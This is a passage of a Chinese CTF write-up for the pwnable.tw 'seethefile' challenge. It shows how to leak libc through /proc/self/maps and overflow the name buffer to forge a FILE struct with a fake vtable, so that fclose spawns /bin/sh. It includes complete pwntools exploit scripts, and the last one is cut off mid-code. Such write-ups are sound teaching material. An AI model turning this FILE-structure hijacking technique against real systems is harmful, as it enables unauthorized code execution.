+<p>如果我要攻擊 2.23 的fclose，可以偽造vtable<br>修改 vtable ptr指向fake vtable，並將fake vtable上每個ptr都改成system<br>並且在fp pointer寫上&#x2F;bin&#x2F;sh，這樣call fclose 時候會跳到system上，fclose(fp) -&gt; system(fp) -&gt; system(‘&#x2F;bin&#x2F;sh’)</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先是Exit的部分有buffer overflow<br>再來在&#x2F;proc&#x2F;self&#x2F;maps會有整個binary記憶體的狀況，所以可以透過open read write他來leak libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x86_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./seethefile&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10200&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0x804889b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### I/O</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">file_path</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;What do you want to see :&#x27;</span>,file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">openfile(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(rcls(<span class="number">3</span>)[<span class="number">2</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + <span class="number">0x3a940</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>觀察一下記憶體的布局，name在fp上方，能對file structure做操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804B</span>260                 public name</span><br><span class="line">.bss:<span class="number">0804B</span>260 ; <span class="type">char</span> name[<span class="number">32</span>]</span><br><span class="line">.bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(?)</span>           ; DATA XREF: main+<span class="number">9F</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4↑o</span><br><span class="line">.bss:<span class="number">0804B</span>280                 public fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br></pre></td></tr></table></figure>
+
+
+<p>詳細利用見上方，這邊直接看要偽造啥</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x804b260</span></span><br><span class="line"><span class="number">0x804b260</span> &lt;name&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x804b270</span> &lt;name+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x804b280</span> &lt;fp&gt;:	<span class="number">0x000000000804c410</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>fp 指向heap上的fp，先將fp修改成bss下方的addr，並在bss上偽造fake FILE</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">50</span>xw <span class="number">0x804c410</span></span><br><span class="line"><span class="number">0x804c410</span>:	<span class="number">0xfbad2488</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c420</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c430</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c440</span>:	<span class="number">0x00000000</span>	<span class="number">0xf7fcdcc0</span>	<span class="number">0x00000003</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c450</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x0804c4a8</span>	<span class="number">0xffffffff</span></span><br><span class="line"><span class="number">0x804c460</span>:	<span class="number">0xffffffff</span>	<span class="number">0x00000000</span>	<span class="number">0x0804c4b4</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c470</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c480</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c490</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c4a0</span>:	<span class="number">0x00000000</span>	<span class="number">0xf7fccac0</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c4b0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x804c4c0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;i386&#x27;</span>:&#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">    <span class="number">0x4</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">    <span class="number">0x8</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">    <span class="number">0xc</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x14</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">    <span class="number">0x18</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x1c</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x20</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x24</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x28</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">    <span class="number">0x2c</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">    <span class="number">0x30</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">    <span class="number">0x34</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">    <span class="number">0x38</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">    <span class="number">0x3c</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">    <span class="number">0x40</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">    <span class="number">0x44</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">    <span class="number">0x46</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">    <span class="number">0x47</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">    <span class="number">0x48</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">    <span class="number">0x4c</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">    <span class="number">0x54</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">    <span class="number">0x58</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">    <span class="number">0x5c</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">    <span class="number">0x60</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">    <span class="number">0x64</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">    <span class="number">0x68</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">    <span class="number">0x6c</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">    <span class="number">0x94</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要偽造<br>flags &#x3D; 0xfbaddfff (_IO_IS_FILEBUF 要關掉，來bypass &amp; _IO_IS_FILEBUF)<br>用分號在下方偽造&#x2F;bin&#x2F;sh<br>vtable 指向 fake vtable addess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">------------- 0x804B260</span><br><span class="line">|  padding  | name (size 0x20) </span><br><span class="line">------------- 0x804B280</span><br><span class="line">| 0x804B290 |</span><br><span class="line">-------------</span><br><span class="line">      |</span><br><span class="line">      ↓</span><br><span class="line">------------- 0x804B290</span><br><span class="line">| 0xffffdfff| fake_fp flag -&gt; NOT _IO_IS_FILEBUF</span><br><span class="line">-------------</span><br><span class="line">|    ;/bi   | fake_fp _IO_read_ptr</span><br><span class="line">------------- </span><br><span class="line">|    n/sh   | fake_fp _IO_read_end</span><br><span class="line">------------- </span><br><span class="line">| ;000000   | fake_fp _IO_read_base</span><br><span class="line">-------------</span><br><span class="line">...</span><br><span class="line">-------------</span><br><span class="line">| 0x804b3d0 | fake_fp vtable (fake_fp+0x140)</span><br><span class="line">-------------</span><br><span class="line">      |</span><br><span class="line">      ↓</span><br><span class="line">------------- fake_fp + 0x140</span><br><span class="line">|  system   | change address to system</span><br><span class="line">|  system   |</span><br><span class="line">|   ...     |</span><br><span class="line">|  system   |</span><br><span class="line">------------- </span><br></pre></td></tr></table></figure>
+<p>最終利用腳本如下</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="local"><a href="#local" class="headerlink" title="local"></a>local</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x86_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./seethefile&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10200&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;connect: &#x27;</span>,REMOTE_IP, REMOTE_PORT)</span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p_c(r,<span class="string">&#x27;b *0x8048acb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### I/O</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">file_path</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;What do you want to see :&#x27;</span>,file_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Leave your name :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">openfile(<span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(rcls(<span class="number">3</span>)[<span class="number">2</span>].split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LIBCBASE&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc_system = libc_base + <span class="number">0x3a940</span> </span><br><span class="line">name_addr = <span class="number">0x804B260</span></span><br><span class="line">fp_pointer_addr = <span class="number">0x804B280</span></span><br><span class="line"></span><br><span class="line">fakefp_addr = <span class="number">0x804B290</span></span><br><span class="line">fake_vtable_addr = fakefp_addr+<span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">fakefp = FileStructure()</span><br><span class="line">fakefp.flags = <span class="number">0xfbaddfff</span></span><br><span class="line">fakefp._IO_read_ptr = <span class="string">b&#x27;;/bi&#x27;</span> </span><br><span class="line">fakefp._IO_read_end = <span class="string">b&#x27;n/sh&#x27;</span></span><br><span class="line">fakefp._IO_read_base = <span class="string">b&#x27;;&#x27;</span></span><br><span class="line">fakefp.vtable = fake_vtable_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span> + p32(fakefp_addr) </span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">12</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(fakefp).ljust(<span class="number">0x140</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc_system)*<span class="number">21</span></span><br><span class="line"></span><br><span class="line">exit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+<h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h3><p>在remote狀況時，需要改一下收libc的地方</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span 